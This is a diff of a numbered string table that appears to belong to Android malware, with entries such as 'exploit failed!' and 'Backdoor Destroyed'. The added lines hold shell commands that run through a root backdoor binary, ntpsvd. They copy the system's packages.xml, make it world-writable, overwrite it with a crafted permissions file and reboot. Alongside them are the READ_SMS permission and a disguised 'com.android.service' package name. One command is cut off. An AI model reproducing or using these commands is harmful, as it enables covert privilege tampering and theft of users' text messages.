@@ -164,7 +164,20 @@
 32.13=exploit failed!
 32.14= air
 32.15=layout
+32.16=android.permission.READ_SMS
+32.17=com.android.service
+32.18=/system/bin/ntpsvd fhc /data/system/packages.xml /data/data/com.android.service/files/packages.xml
+32.19=/system/bin/ntpsvd pzm 666 /data/data/com.android.service/files/packages.xml
 32.2=/system/bin/ntpsvd
+32.20=/data/data/com.android.service/files/test
+32.21=packages.xml
+32.22=/data/data/com.android.service/files/packages.xml
+32.23=perm.xml
+32.24=/system/bin/ntpsvd qzx \"cat /data/data/com.android.service/files/layout > 
+32.25=/system/bin/ntpsvd qzx \"cat /data/data/com.android.service/files/perm.xml > /data/system/packages.xml\"
+32.26=/data/data/com.android.service/files/perm.xml
+32.27=/data/data/com.android.service/files/layout
+32.28=/system/bin/ntpsvd reb
 32.3=Backdoor Destroyed
 32.4=errorlog
 32.5=statuslog
@@ -180,3 +193,6 @@
 34.0=UnicodeLittleUnmarked
 35.0=qzx
 35.1=/system/bin/sh
+36.0=0xA83E0F44BD7A4D20
+36.1=0x5A3D10448D7A912B
+36.2=0x5A3D10448D7A912A
